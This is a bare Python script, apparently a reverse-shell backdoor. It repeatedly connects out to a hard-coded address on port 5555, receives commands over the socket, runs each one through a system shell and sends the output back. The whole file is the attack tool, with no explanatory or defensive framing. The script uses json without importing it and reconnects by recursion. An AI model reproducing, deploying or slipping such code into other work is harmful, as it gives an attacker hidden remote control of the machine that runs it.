import socket
import time
import subprocess



def reliable_send(data):
     jsondata = json.dumps(data)
     sock1.send(jsondata.encode())

def reliable_recv():
     data = ''

     while True:

          try:

               data = data + sock1.recv(1024).decode().rstrip()
               return json.loads(data)

          except ValueError:
               continue
          

def connection():

     while True:

          time.sleep(20)

          try:
               sock1.connect(('192.168.1.10', 5555))
               shell()
               sock1.close()
               break

          except:          
               connection()

def shell():

     while True:

          command = reliable_recv()

          if command == 'quit':
               break

          else:

               execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE )
               result = execute.stdout.read() + execute.stderr.read()
               result = result.decode()
               reliable_send(result)

sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connection()